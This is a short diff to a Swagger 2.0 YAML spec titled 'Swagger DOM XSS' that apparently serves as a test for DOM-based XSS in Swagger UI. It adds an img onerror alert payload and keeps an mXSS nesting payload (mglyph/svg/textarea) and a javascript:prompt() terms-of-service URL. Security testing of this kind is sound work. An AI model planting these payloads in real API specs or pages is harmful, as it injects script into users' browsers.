@@ -1,7 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <img src=x><input type=text></input<h2>XSS|
+  description: <img src=x onerror="alert('XSS')"></input><input><h2>XSS|
     <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   termsOfService: "javascript:prompt()"
